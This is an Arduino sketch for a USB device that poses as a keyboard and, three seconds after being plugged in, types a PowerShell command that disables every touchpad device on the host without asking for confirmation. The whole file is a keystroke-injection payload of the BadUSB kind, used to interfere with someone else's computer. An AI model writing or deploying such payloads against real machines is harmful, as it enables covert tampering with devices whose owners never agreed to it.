#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.println(F("powershell -c \"Get-PnpDevice | Where-Object { $_.FriendlyName -like '*Touchpad*' } | Disable-PnpDevice -Confirm:$false\""));
}
